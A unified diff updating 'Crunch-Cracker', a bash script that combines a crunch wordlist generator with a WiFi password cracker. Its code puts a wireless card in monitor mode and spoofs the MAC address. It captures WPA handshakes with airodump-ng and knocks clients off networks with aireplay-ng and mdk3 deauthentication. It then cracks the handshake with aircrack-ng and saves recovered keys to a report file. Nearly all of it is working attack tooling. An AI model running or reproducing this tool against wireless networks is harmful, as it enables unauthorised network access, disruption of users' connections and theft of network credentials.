@@ -1,5 +1,23 @@
 #!/bin/bash
 
+##########################################################
+#                                                        #
+#	8eeee8                                           #
+#	8    i eeeee  e   e eeeee eeee e   e             #
+#	8e     8   8  8   8 8   8 8  8 8   8             #
+#	88     8eee8e 8e  8 8e  8 8e   8eee8             #
+#	88   e 88   8 88  8 88  8 88   88  8             #
+#	88eee8 88   8 88ee8 88  8 88e8 88  8             #
+#	                                                 #
+#    8eeee8                                              #
+#    8    i eeeee  eeeee eeee e   e  eeee eeeee          #
+#    8e     8   8  8   8 8  8 8   8  8    8   8          #
+#    88     8eee8e 8eee8 8e   8eee8e 8eee 8eee8e         #
+#    88   e 88   8 88  8 88   88   8 88   88   8         #
+#    88eee8 88   8 88  8 88e8 88   8 88ee 88   8 v 1.3   #
+#                                                        #
+##########################################################
+#
 # *************************
 # * Crunch-Cracker V 1.0b *
 # *************************
@@ -8,7 +26,7 @@
 # 
 # Date: 10/10/2016
 # Dev: Shell
-# BY: KURO
+# BY: KURO-CODE
 #
 # *************************
 # * Crunch-Cracker V 1.1  *
@@ -19,7 +37,7 @@
 # 
 # Date: 23/04/2017
 # Dev: Shell
-# BY: KURO
+# BY: KURO-CODE
 #
 # *************************
 # * Crunch-Cracker V 1.2  *
@@ -30,21 +48,30 @@
 # 
 # Date: 29/04/2017
 # Dev: Shell
-# BY: KURO
+# BY: KURO-CODE
+#
+# *************************
+# * Crunch-Cracker V 1.3  *
+# *************************
+#						 
+# + Bug Fix
+# + Graphic
+# + Report file
+# 
+# Date: 17/01/2018
+# Dev: Shell
+# BY: KURO-CODE
 #
 
-
-#### CONFIG ####################################################################
-
+#**** CONFIG ****
 DUMP="Wordlist"
 TMP2="KEY"
-mon="mon"
 
+#~~~~ Geometry ~~~~
 TOPLEFTBIG="-geometry 100x85+0+0"
 TOPLEFTBIG2="-geometry 100x20+0+0"
 
 #**** Colors ****
-
 W="\033[1;37m"
 GR="\033[0;37m"
 R="\033[1;31m"
@@ -52,14 +79,18 @@ G="\033[1;32m"
 Y="\033[1;33m"
 EC="\033[0m"
 
+#**** DATE ****
+DATE=`date`
 
-#**** txt ****
+#**** TXT ****
+Air_P="AirPlay"
+Mdk_3="MDK3"
 
-Titre=" Crunch-Cracker v1.1 "
-
+#**** Info ****
+Inf_Name="Crunch-Cracker"
+Inf_Ver="1.3"
 
 #**** PATH ****
-
 chmod +x aimon-ng
 
 if [ -d "$DUMP" ];
@@ -71,11 +102,11 @@ if [ -d "$DUMP" ];
 	fi
 
 #**** SET LANGUAGE ****
-
 function setting {
 
-if [ "$CC_AUTO" =  "1" ];then 
-	english; setting
+if [ "$CC_AUTO" =  "1" ];
+	then 
+		english; setting
 
 else 
 
@@ -91,9 +122,7 @@ else
      ║   ║$G 1$GR ║$W English  ║   ║
      ╚═══╣$G 2$GR ║$W French   ╠═══╝
 	 ║$G 3$GR ║$W Spanish  ║
-	 ╚═══╩══════════╝"
-
-                
+	 ╚═══╩══════════╝"        
 	echo 
 	read -p " Choice: " choix
 	echo ""
@@ -101,19 +130,19 @@ else
 		1 ) eng; main; break ;;
             	2 ) fr; main; break;;
 		3 ) span; main; break;;
-		* ) echo -e "$W [$R ERROR $W]" && sleep 3 ;setting;;
+		* ) echo -e "$W [$R ERROR $W]"; sleep 3 ;setting;;
 	  esac
     done
 fi 
-
 }
 
-function eng {
-
+#**** ENG ****
+eng() {
 	OPT="$W  O$GR""p$W""T$GR""io$W""N"
 	NAME_WL=" Name"
 	error=" ERROR"
 	Choice=" Option"
+	CHOICE_DEVICE="Device:"
 	YES="Yes"
 	NO="No "
 	MAKE="$W""C$GR""re$W""AT$GR""e a$W W$GR""o$W""RDL$GR""is$W""T "
@@ -128,15 +157,15 @@ function eng {
 	OFF=" Thank you for using$R C$W""runch$G-$R""C$W""racker"
 
 #~~~~ INFO ~~~~
-	INFBAR="╔═════════════════════════════════════════╗"
-	INFBAR2="╚═════════════════════════════════════════╝"
-	INFNAME="$G Name:$W.......Crunch-Cracker            "
-	INFVER="$G Version:$W....1.2                       "
-	INFLNG="$G Language:$W...[ENG, FR, ESP]            "
-	INFDATE="$G Date:$W.......04/29/2017                "
-	INFAUTH="$G Author:$W.....KURO                      "
-	INFTYPE="$G Type:$W.......Simple Wordlist generator "
-	INFDEV="$G Dev:$W........Shell                     "
+	INFBAR=" ╔══════════════════════════════════════════════╗"
+	INFBAR2=" ╚══════════════════════════════════════════════╝"
+	INFNAME="║$G Name:$W.......$Inf_Name                   ║"
+	INFVER="║$G Version:$W....$Inf_Ver                              ║"
+	INFLNG="║$G Language:$W...[ENG, FR, ESP]                   ║"
+	INFDATE="║$G Date:$W.......04/29/2017                       ║"
+	INFAUTH="║$G Author:$W.....KURO-CODE                        ║"
+	INFTYPE="║$G Type:$W.......Wordlist generator/Wifi cracker  ║"
+	INFDEV="║$G Dev:$W........Shell                            ║"
 
 #~~~~ SET LIST ~~~~
 	TLIST="╔═════════════════════════════════════╗"
@@ -165,7 +194,6 @@ function eng {
 	TCRACK="╔═══╦════════╗"
 	TCRACK2="╚═══╩════════╝"
 	C_SCAN="WIFI attack "
-	C_CRACK="Scan  "
 	C_RETURN="Return "
 
 #~~~~ HEADER SCAN ~~~~
@@ -177,16 +205,23 @@ MACCHANGR=""$W"["$G"i"$W"] Restoration $GR""Macchanger$W"
 NMANAGER="["$G"i"$W"] Restart $GR""Network-manager$W"
 CLOSEMON="$W[$G*$W] Kill  $GR""airmon-ng$W"
 
+#~~~~ REPORT ~~~~
+K_Found="$G Key Found:$W "
+R_Title="Attack report"
+R_SAVE="$G *** Save:$Y "
+
+#~~~~ Fail ~~~~
+A_Fail="$W [$R""X$W]...$R""Attack fail$EC"
 }
 
-
-function fr {
-
+#**** FR ****
+fr() {
 #~~~~ MENU ~~~~    	
 	OPT="$W  O$GR""p$W""T$GR""i$W""O$GR""n"
 	NAME_WL=" Nom"
     	error="ERREUR"
     	Choice=" Option"
+	CHOICE_DEVICE="Carte:"
 	YES="Oui"
 	NO="Non"
 	MAKE="$W""C$GR""ré$W""ER U$GR""ne $W""WO$GR""r$W""DL$GR""i$W""ST"
@@ -201,15 +236,15 @@ function fr {
 	OFF="Merci d'avoir utilisé$R C$W""runch$G-$R""C$W""racker"
 
 #~~~~ INFO ~~~~
-	INFBAR="╔═══════════════════════════════════════════╗"
-	INFBAR2="╚═══════════════════════════════════════════╝"
-	INFNAME="$G Nom:$W......Crunch-Cracker		    "
-	INFVER="$G Version:$W..1.2 			    "
-	INFLNG="$G Langue:$W...[ENG, FR, ESP]		    "
-	INFDATE="$G Date:$W.....29/04/2017		    "
-	INFAUTH="$G Auteur:$W...KURO			    "
-	INFTYPE="$G Type:$W.....Simple générateur de Wordlist "
-	INFDEV="$G Dev:$W......Shell 			    "
+	INFBAR=" ╔═══════════════════════════════════════════════╗"
+	INFBAR2=" ╚═══════════════════════════════════════════════╝"
+	INFNAME="║$G Nom:$W......$Inf_Name		          ║"
+	INFVER="║$G Version:$W..$Inf_Ver 			          ║"
+	INFLNG="║$G Langue:$W...[ENG, FR, ESP]		          ║"
+	INFDATE="║$G Date:$W.....29/04/2017		          ║"
+	INFAUTH="║$G Auteur:$W...KURO-CODE			          ║"
+	INFTYPE="║$G Type:$W.....Générateur Wordlist/Cracker Wifi    ║"
+	INFDEV="║$G Dev:$W......Shell 			          ║"
 
 #~~~~ SET LIST ~~~~
 	TLIST="╔════════════════════════════════════╗"
@@ -239,7 +274,6 @@ function fr {
 	TCRACK="╔═══╦════════╗"
 	TCRACK2="╚═══╩════════╝"
 	C_SCAN="Attaque WIFI"
-	C_CRACK="scanne"
 	C_RETURN="Retour "
 
 #~~~~ HEADER SCAN ~~~~
@@ -251,15 +285,23 @@ MACCHANGR=""$W"["$G"i"$W"] Kill $GR Macchanger$W"
 NMANAGER="["$G"i"$W"] Redemarrage du service $GR Network-manager$W"
 CLOSEMON="$W[$G*$W] Désactivation du$GR monitoring"
 
+#~~~~ Report ~~~~
+K_Found="$G Cle trouvee:$W "
+R_Title="Rapport"
+R_SAVE="$G *** Enregistrer:$Y "
+
+#~~~~ Fail ~~~~
+A_Fail="$W [$R""X$W]...$R""Attaque ratee$EC"
 }
 
-function span {
-
+#**** SPAN ****
+span() {
 #~~~~ MENU ~~~~
 	OPT="$W O$GR""pc$W""I$GR""o$W""n "
 	NAME_WL=" Nombre"
     	error="ERROR"
     	Choice=" Opcion"
+	CHOICE_DEVICE="Dispositivo:"
 	YES="Si "
 	NO="No "
 	MAKE="$W""C$GR""re$W""A$GR""r $W""U$GR""n$W""A LI$GR""st$W""A   "
@@ -274,16 +316,15 @@ function span {
 	OFF="Gracias por usar$Y C$W""runch$G""-$Y""C$W""racker"
 
 #~~~~ INFO ~~~~
-	INFBAR="╔═══════════════════════════════════╗"
-	INFBAR2="╚═══════════════════════════════════╝"
-	INFNAME="$G Nombre:$W...Crunch-Cracker        "
-	INFVER="$G Version:$W..1.2 	            "
-	INFLNG="$G Lengua:$W...[ENG, FR, ESP]        "
-	INFDATE="$G Fecha:$W....29/04/2017            "
-	INFAUTH="$G Autor:$W....KURO                  "
-	INFTYPE="$G Tipo:$W.....Generador de Wordlist "
-	INFDEV="$G Dev:$W......Shell 	            "
-
+	INFBAR=" ╔════════════════════════════════════════════════╗"
+	INFBAR2=" ╚════════════════════════════════════════════════╝"
+	INFNAME="║$G Nombre:$W...$Inf_Name                       ║"
+	INFVER="║$G Version:$W..$Inf_Ver 	                           ║"
+	INFLNG="║$G Lengua:$W...[ENG, FR, ESP]                       ║"
+	INFDATE="║$G Fecha:$W....29/04/2017                           ║"
+	INFAUTH="║$G Autor:$W....KURO-CODE                            ║"
+	INFTYPE="║$G Tipo:$W.....Generador de Wordlist/Wifi Cracker   ║"
+	INFDEV="║$G Dev:$W......Shell 	                           ║"
 
 #~~~~ SET LIST ~~~~
 	TLIST="╔═══════════════════════════════════╗"
@@ -312,10 +353,8 @@ function span {
 	TCRACK="╔═══╦═════════╗"
 	TCRACK2="╚═══╩═════════╝"
 	C_SCAN="Ataque WIFI "
-	C_CRACK="Escaner"
 	C_RETURN="Regreso "
 	
-
 #~~~~ HEADER SCAN ~~~~
 header_scanchan="Busca el red"
 
@@ -325,20 +364,22 @@ MACCHANGR=""$W"["$G"i"$W"] Restauracion$GR Macchanger$W"
 NMANAGER="["$G"i"$W"] Reinicio del$GR Network-manager$W"
 CLOSEMON="$W[$G*$W] Désactivation du$GR monitoring$W"
 
+#~~~~ Report ~~~~
+K_Found="$G Clave encontrada:$W "
+R_Title="Ataque Informe"
+R_SAVE="$G *** Salvar:$Y "
 
-
+#~~~~ Fail ~~~~
+A_Fail="$W [$R""X$W]...$R""Ataque fallido$EC"
 }
-
 
 #**** SET LANGUAGE END ****
 
 ##### CONFIG END ###################################################################
 
 
-#### INTRO ########################################################################
-
-function RUN {
-
+#~~~~ INTRO ~~~
+RUN() {
 	clear
 	sleep 0.5
 	echo -e "$G		8eeee8 "
@@ -359,32 +400,23 @@ function RUN {
 	echo -e "	     8e     8   8  8   8 8  8 8   8  8    8   8 " 
 	echo -e "	     88     8eee8e 8eee8 8e   8eee8e 8eee 8eee8e "
 	echo -e "	     88   e 88   8 88  8 88   88   8 88   88   8 "
-	echo -e "	     88eee8 88   8 88  8 88e8 88   8 88ee 88   8$GR"" v 1.2"
+	echo -e "	     88eee8 88   8 88  8 88e8 88   8 88ee 88   8$GR"" v $Inf_Ver"
 	sleep 0.5
 	echo
 	echo -e "$G	  [$Y""W$G]$W""or$G[$Y""D$G]$W""li$G[$Y""$""$G]$W""t$G [$Y""G$G]$W""en$G[$Y""E$G]$W""ra$G[$Y""T$G]$W""or$R/$W[$Y""W$W]$G""i$W[$Y""F$W]$G""i c$W[$Y""R$W]$G""ac$W[$Y""K$W]$G""er "
 	sleep 0.5
 	echo -e "			         $W[$G""B$W]$G""y "
 	sleep 0.5
-	echo -e "			      $W[$Y""K$W][$G""U$W]$G""R$W[$R""O$W] "
+	echo -e "			 $W[$Y""K$W][$G""U$W]$G""R$W[$R""O$W]-$W[$Y""C$W][$G""O$W]$G""D$W[$R""E$W] "
 	sleep 3
 	setting
-
 }
 
-#### INTRO END #############################################################################
-
-
-#~~~~ Menu 1 ~~~~
-
-function main {
-
+#~~~~ Main Menu ~~~~
+main() {
 	clear
-
 	echo
-
 	top
-
 	echo -e "
   $W╔═════════════╗
   ║ $OPT $W   ║
@@ -402,35 +434,28 @@ function main {
 			0) EXITMENU;;
 			*) echo -e "$W [$R $error$W ]" && sleep 3
 		esac
-	
-
 }
 
 #~~~~ INFO ~~~~
-
-function information {
-
+information() {
 	clear
-
 	echo
-
 	top
-
 	echo
 	echo -e " $INFBAR"	
-	echo -e " ║ $INFNAME ║"
+	echo -e "  $INFNAME "
 	sleep 0.2
-	echo -e " ║ $INFVER ║"
+	echo -e "  $INFVER "
 	sleep 0.2
-	echo -e " ║ $INFLNG ║"
+	echo -e "  $INFLNG "
 	sleep 0.2
-	echo -e " ║ $INFDATE ║"
+	echo -e "  $INFDATE "
 	sleep 0.2
-	echo -e " ║ $INFAUTH ║"
+	echo -e "  $INFAUTH "
 	sleep 0.2
-	echo -e " ║ $INFTYPE ║"
+	echo -e "  $INFTYPE "
 	sleep 0.2
-	echo -e " ║ $INFDEV ║"
+	echo -e "  $INFDEV "
 	echo -e " $INFBAR2"
 	echo
 	sleep 0.5 
@@ -439,18 +464,11 @@ function information {
 main
 }
 
-#### INFO END ######################################################################
-
-#### MENU CRUNCH ###################################################################
-
-function Crunchmenu {
-
+#~~~~ MENU CRUNCH ~~~~
+Crunchmenu() {
 	clear
-
 	echo
-
 	top
-
 	echo -e "
   $W╔════════════════════╗
   ║     $OPT $GR      ║
@@ -465,22 +483,17 @@ function Crunchmenu {
 	read -p " $Choice: " choix
 		case $choix in
 			1) LST;;
-			2) CRACKER;;
+			2) MONITOR;;
 			3) main;;
 			0) EXITMENU;;
-			*) echo -e "$W [$R $error$W ]" && sleep 3
+			*) echo -e "$W [$R $error$W ]"; sleep 3; Crunchmenu;;
 		esac
-Crunchmenu
 }
 
-
-#**** Set list ****
+#~~~~ Set list ~~~~
 function LST {
-
 	clear
-
 	top
-
 	echo
 	echo -e "$SETLIST_INFMIN $W "
 	echo
@@ -526,8 +539,7 @@ function LST {
 compress
 }
 
-#### COMPRESS ####################################################################
-
+#~~~~ Function COMPRESS ~~~~
 function compress {
 		clear
 		echo
@@ -557,105 +569,58 @@ function compress {
 			   sleep 1
 			   echo -e " $COMPRESS_SUPP$Nom.txt"
 			   sleep 3 ;;
-
 			2) main;;
 			0) EXITMENU;;
-			*) echo -e "$W [$R $error$W ]" && sleep 3 compress;;
+			*) echo -e "$W [$R $error$W ]"; sleep 3; compress;;
 		esac
-
 main
-
 }
 
-#####################################################################################
-
-##### Function CRACKER ##############################################################
-
-function CRACKER {
-
-	clear
-	echo
-	top
-	echo
-	echo -e "
-  $W╔════════════════════╗
-  ║     $OPT $W      ║
-  ╚═╦══════════════════╝
-    ║   $TCRACK
-    ║   ║$G 1 $W║ $C_CRACK $W║
-    ╚═══╣$R 0 $W║$R $C_RETURN$W║
-	$TCRACK2$W"
-	echo
-	read -p " $Choice: " choix
-		case $choix in
-			1) MONITOR;;
-			0) main;;
-			*) echo -e "$W [$R $error$W ]" && sleep 3
-		esac
-Crunchmenu	
-
-}
-
-
-##### Function CRACKER END ##########################################################
-
-
-##### Function SCAN #################################################################
-
+#~~~~ Function Monitoring ~~~~
 function MONITOR {
-
 	clear
-
 	mkdir CRACKTMP
 	TMP="CRACKTMP"
-
 	top
 	echo 
 	echo -e "$SELECT_DEVICE$Y"
 	echo
 	ifconfig | grep -a 'wlan' | awk '{print $1}'
 	echo -e "$W"
-	read -p "Carte: " device
+	read -p "$CHOICE_DEVICE " device
 	clear
 	top
 	echo
 	ifconfig $device down
+	iwconfig $device mode monitor
 	sleep 1
+	echo -e ""$W"["$G"i"$W"]....$GR""Macchanger$W"
 	macchanger -r $device
 	sleep 1 
 	ifconfig $device up
 	sleep 1
-	clear
-	top
-	echo
-	airmon-ng check kill
-	airmon-ng start $device
+	echo -e ""$W"["$G"i"$W"]....$GR""Monitor$W"
 	sleep 2
 SCANNER
 }
 
+#~~~~ Function Scan ~~~~
 function SCANNER {
-
 	CSV=dump-01.csv
-
 	rm -rf $TMP/*
-
-	xterm -hold -title "$header_scan" $TOPLEFTBIG -bg "#000000" -fg "#11ff00" -e airodump-ng -w $TMP/DUMP -a $device$mon --ignore-negative-one &
+	xterm -hold -title "$header_scan" $TOPLEFTBIG -bg "#000000" -fg "#11ff00" -e airodump-ng -w $TMP/DUMP -a $device --ignore-negative-one &
 	sleep 10
 	killall xterm
 OUTSCAN
-
 }
-##### Function SCAN END #############################################################
 
+#~~~~ OUTSCAN ~~~~
 function OUTSCAN {
-
 	clear
 	top
 	CSV="DUMP-01.csv"
 	WIFI=`wc -l $TMP/$CSV | awk '{print $1}'`
 	echo 
-
 	head -n $CIBLE $TMP/$CSV &> $TMP/dump-02.csv
 	tail -n +$CIBLE $TMP/$CSV &> $TMP/target.csv
 	echo "                        WIFI LIST "
@@ -663,7 +628,6 @@ function OUTSCAN {
 	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
 	echo ""
 	i=0
-
 	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
 		longueur=${#MAC}
 		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
@@ -672,15 +636,11 @@ function OUTSCAN {
 			i=$(($i +1))
 			POWER=`expr $POWER + 100`
 			TARGET=`cat $TMP/target.csv | grep $MAC`
-
 			if [ "$TARGET" != "" ]; then
 				TARGET="*"
 			echo -e " "$R"["$Y"$i"$R"]"$G"$TARGET\t""$R"$MAC"\t""$R "$CHANNEL"\t""$G" $PRIVACY"\t  ""$R"$POWER%"\t""$R "$ESSID""$EC""
-
 			else
-
 			echo -e " "$R"["$Y"$i"$R"]"$W"$TARGET\t""$Y"$MAC"\t""$G "$CHANNEL"\t""$GR" $PRIVACY"\t  ""$Y"$POWER%"\t""$G "$ESSID""$EC""
-
 			fi
 
 			aidlength=$IDLENGTH
@@ -690,8 +650,7 @@ function OUTSCAN {
 			aprivacy[$i]=$PRIVACY
 			aspeed[$i]=$SPEED
 		fi
-	done < $TMP/$CSV
- 
+	done < $TMP/$CSV 
 	if [ "$CC_AUTO" = "1" ];then 
 		choice=1
 	else
@@ -702,7 +661,6 @@ function OUTSCAN {
 		echo -n -e " $G$HTARGET:$W "
 		read choice
 	fi 
-
 	if [[ $choice -eq "r" ]]; then
 		SCANNER
 	fi
@@ -725,69 +683,58 @@ function OUTSCAN {
 
 	HANDSHAK & 
 	sleep 4
-
+	echo "#!/bin/sh
+xterm -e \"timeout 10 mdk3 $device a -d $Host_MAC -m\"">> $TMP/MDK
+sleep 4
+AirPlay
 VALID
-
 }
 
-##### Function HANDSHAK #########################################################
-
+#~~~~ HANDSHAK ~~~~
 function HANDSHAK { 
-
-	xterm -hold $TOPLEFTBIG2 -e "airodump-ng -w $TMP/$OUTPUT -c$Host_CHAN --essid $Host_SSID --bssid $Host_MAC $device$mon" & 
-
+	xterm -hold -title "$Host_SSID" $TOPLEFTBIG2 -e "airodump-ng -w $TMP/$OUTPUT -c$Host_CHAN --essid $Host_SSID --bssid $Host_MAC $device" &
 }
 
-##### Function HANDSHAK END #####################################################
-
-
-######## Function VALID ##########################################################
-
-function VALID {
-
+#~~~~ Function VALID ~~~~
+VALID() {
 	clear
 	top
 	echo -e "
 	Handshake 
 		  $W[$G""1$W] $YES
-		  [$Y""2$W] $NO  "
+		  [$Y""2$W] $NO 
+		  [$Y""9$W] Rescan   
+		  [$R""0$W]$R $Exit$EC"
 	echo
 	read -p " $Choice: " choix
 		case $choix in
-			1) KILLPROC;;
-			2) DEAUTH;;
-			*) echo -e "$W [$R $error$W ]" && sleep 3
+			1) KILLPROC; SETCRACK;;
+			2) AirPlay;;
+			9) KILLPROC; SCANNER;;
+			0) NETWORKRESTOR; EXITMENU;;
+			*) echo -e "$W [$R $error$W ]"; sleep 3; VALID;;
 		esac
 }
 
-######## Function DEAUTH ########################################################
-
-function DEAUTH {
-	
+#~~~~ Function DEAUTH ~~~~
+function AirPlay {
+	clear
+	top
+	echo -e "
+ [$G!$W]$GR...$W""Deauth $Host_SSID
+"
 	DD="aireplay-ng --deauth 10 -a " 
-	$DD $Host_MAC $device$mon 
-	
-VALID
+       	$DD $Host_MAC $device &&
+	VALID
 }
 
-
-######## Function DEAUTH END #####################################################
-
-#~~~~ KILL ~~~~
-
+#~~~~ KILL Process ~~~~
 function KILLPROC {
-
-	killall xterm &
-
-SETCRACK
-
+	killall xterm
 }
-
 
 #~~~~ SETCRACK ~~~~
-
-function SETCRACK() {
-
+SETCRACK() {
 	clear
 	top
 	echo -e "
@@ -797,20 +744,17 @@ function SETCRACK() {
 		  [$Y""2]$W $NO  
 		  [$R""0]$R $Exit $W"
 	echo
-	read -p " Choix: " choix
+	read -p " $Choice: " choix
 		case $choix in
 			1) RLIST;;
 			2) CRK;;
-			0) EXITMENU;;
-			*) echo -e "$W [$R $error$W ]" && sleep 3
+			0) NETWORKRESTOR;EXITMENU;;
+			*) echo -e "$W [$R $error$W ]"; sleep 3; SETCRACK;;
 		esac
 }	
 
-######## Function VALID END ################################################
-
 #~~~~ FOLDER LIST ~~~~
-function RLIST {
-
+RLIST() {
 	clear
 	top
 	echo
@@ -820,13 +764,10 @@ function RLIST {
 	echo " "
 	read -p " List: " WORDLIST
 CRACKLIST
-
 }
 
-##### Function CRK #########################################################
-
-function CRK() {
-
+#~~~~ Function CRK ~~~~
+function CRK {
 	if [ -d "$TMP2" ];
 		then
 			echo -e " ";
@@ -834,19 +775,47 @@ function CRK() {
 			echo -e " ";
 			mkdir $TMP2
 	fi
-	xterm -hold -e "aircrack-ng $TMP/$OUTPUT-01.cap -l $TMP2/KEY_$Host_SSID.txt" &
+	xterm -e "aircrack-ng $TMP/$OUTPUT-01.cap -l $TMP/KEY_$Host_SSID.txt" &&
+	if [ -f "$TMP/KEY_$Host_SSID.txt" ]; 
+		then
+			kf=`cat $TMP/KEY_$Host_SSID.txt`
+			echo -e " $DATE
 
-NETWORKRESTOR
+ 	$K_Found$kf
+
+$R_SAVE$TMP2/KEY_$Host_SSID.txt
+"
+			echo "
+*** $R_Title ***
+  Date: $DATE 
+
+    ESSID:....$Host_SSID
+    BSSID:....$Host_MAC 
+    Sec-Enc:..$Host_ENC
+    Key:......$kf
+" >> $TMP2/KEY_$Host_SSID.txt
+			echo -e "$W $Return$R [$ENTER]"
+			read pause
+			NETWORKRESTOR
+			main
+	else
+		clear
+		echo
+		top
+		echo
+		echo -e "$A_Fail"
+		sleep 5
+		NETWORKRESTOR
+		main
+	fi
 }
 
 #~~~~ WORDLIST ~~~~
-function CRACKLIST() {
-	
+function CRACKLIST {
 	clear
 	echo
 	top
 	echo
-
 	if [ -d "$TMP2" ];
 		then
 			echo -e " ";
@@ -854,33 +823,54 @@ function CRACKLIST() {
 			echo -e " ";
 			mkdir $TMP2
 	fi
+	xterm -e "aircrack-ng $TMP/$OUTPUT-01.cap -w $DUMP/$WORDLIST -l $TMP/KEY_$Host_SSID.txt" &&
+	if [ -f "$TMP/KEY_$Host_SSID.txt" ]; 
+		then
+			kf=`cat $TMP/KEY_$Host_SSID.txt`
+			echo -e " $DATE
 
+ 	$K_Found$kf
 
-	xterm -hold -e "aircrack-ng $TMP/$OUTPUT-01.cap -w $DUMP/$WORDLIST -l $TMP2/KEY_$Host_SSID.txt" &
-	
-NETWORKRESTOR
+$R_SAVE$TMP2/KEY_$Host_SSID.txt
+"
+		echo "
+*** $R_Title ***
+  Date: $DATE 
+
+    ESSID:....$Host_SSID
+    BSSID:....$Host_MAC
+    Sec-Enc:..$Host_ENC 
+    Key:......$kf
+" >> $TMP2/KEY_$Host_SSID.txt
+		echo -e "$W $Return$R [$ENTER]"
+		read pause
+		NETWORKRESTOR
+		main
+	else
+		clear
+		echo
+		top
+		echo
+		echo -e "$A_Fail"
+		sleep 5
+		NETWORKRESTOR
+		main
+	fi
 }
-##### Function CRK END #####################################################
 
 #~~~~ NETWORKRESTOR ~~~~
 function NETWORKRESTOR {
-
 	clear
 	echo
 	top
 	echo
 	rm -Rf $TMP
 	echo -e "$CLOSEMON"
-	airmon-ng stop $device$mon
-	sleep 3
-	clear
-	echo
-	top
-	echo
-	echo -e "$MACCHANGR"
 	ifconfig $device down
+	iwconfig $device mode managed
 	sleep 2
-	sudo macchanger -p $device
+	echo -e "$MACCHANGR"
+	macchanger -p $device
 	sleep 2
 	ifconfig $device up
 	sleep 2
@@ -891,54 +881,33 @@ function NETWORKRESTOR {
 	sleep 0.5
 	service network-manager restart
 	sleep 5
-main
-
 }
 
-##### Function Top ##################################################################
-
-function top() {
-
+#~~~~ Function Top ~~~~
+top() {
 	clear
 	echo
 	sleep 0.1 
 	echo -e " $W╔═════════════════════════════════════════════╗" 
-	echo -e " ║$R  	C$W R U N C H $R C$W R A C K E R$GR  v$G 1.2$W      ║" 
+	echo -e " ║$R  	C$W R U N C H $R C$W R A C K E R$GR  v$G $Inf_Ver$W      ║" 
 	echo -e " $W╚═════════════════════════════════════════════╝"
 	sleep 0.5
-	
-
 }
 
-
-##### EXIT ###################################################################################
-
+#~~~~ EXIT ~~~~
 function EXITMENU {
-
 	clear
 	echo
 	top
 	echo
 	echo -e "$W $CLOSE"
-	echo
-	sleep 0.5
-	echo -e "$CLEAN"
-	sleep 0.5	
-	echo -e "$MACCHANGR"
-	sleep 0.5
-	service network-manager restart
-	echo -e "$NMANAGER"
-	sleep 5
-	echo
 	echo -e " [$R*$W] $G $OFF $W [$R*$W]"
 	sleep 3
 	clear
 	exit
 }
+#>>>>>>>>>>>>> END <<<<<<<<<<<<<<<<<<
 
-######################################## END ######################################
-
-####################################### START #####################################
-
+#************ START *****************
 RUN
 
